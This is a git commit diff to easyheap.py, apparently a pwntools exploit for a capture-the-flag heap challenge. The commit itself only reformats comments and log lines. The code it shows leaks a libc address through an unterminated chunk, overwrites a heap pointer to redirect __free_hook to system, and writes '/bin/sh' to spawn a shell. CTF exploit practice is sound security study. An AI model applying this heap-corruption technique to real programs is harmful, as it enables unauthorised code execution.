c38eb7861bc97e325d15a7426af2c067d74a8820
xero <stratosuni@yahoo.gr>
2017-09-05 13:28:16 +0300

    Update easyheap.py

--- easyheap/easyheap.py
+++ easyheap/easyheap.py
@@ -48,12 +48,12 @@ def pwn():
 	alloc(0x80, 'C'*10)
 	alloc(0x80, 'D'*10)
   
-  # Populating the smallbin with a pointer to main_arena
+        # Populating the smallbin with a pointer to main_arena
 	free(2)
 
 	payload = 'Z'*64
-  # Since there's no null-byte termination, we can overflow
-  # the chunk up until the pointer to main_arena
+        # Since there's no null-byte termination, we can overflow
+        # the chunk up until the pointer to main_arena
 	edit(1, 80, payload)
 
 	p.recvuntil(payload)
@@ -65,22 +65,22 @@ def pwn():
 	malloc_hook = leak - 0x78
 	free_hook   = leak + 0x2258
 
-	log.info("Leak: 		     0x{:x}".format(leak))
+	log.info("Leak:            0x{:x}".format(leak))
 	log.info("Libc:     	   0x{:x}".format(libc))
-	log.info("__malloc_hook: 0x{:x}".format(malloc_hook))
-	log.info("__free_hook:   0x{:x}".format(free_hook))
-	log.info("system: 	     0x{:x}".format(system))
+	log.info("__malloc_hook:   0x{:x}".format(malloc_hook))
+	log.info("__free_hook:     0x{:x}".format(free_hook))
+	log.info("system: 	   0x{:x}".format(system))
 
 	payload  = 'A'*40
 	payload += p64(free_hook)
   
-  # Overflowing the second alloc'd chunk to contain the pointer
-  # to __free_hook instead of the pointer to our data
-  # Next time edit() is called on the 2nd chunk, we fool the binary into thinking
-  # that we want to edit the address of __free_hook
+        # Overflowing the second alloc'd chunk to contain the pointer
+        # to __free_hook instead of the pointer to our data
+        # Next time edit() is called on the 2nd chunk, we fool the binary into thinking
+        # that we want to edit the address of __free_hook
 	edit(0, 50, payload)
   
-  # __free_hook => system
+        # __free_hook => system
 	edit(1, 10, p64(system))
   
 	edit(0, 10, '/bin/sh\x00')
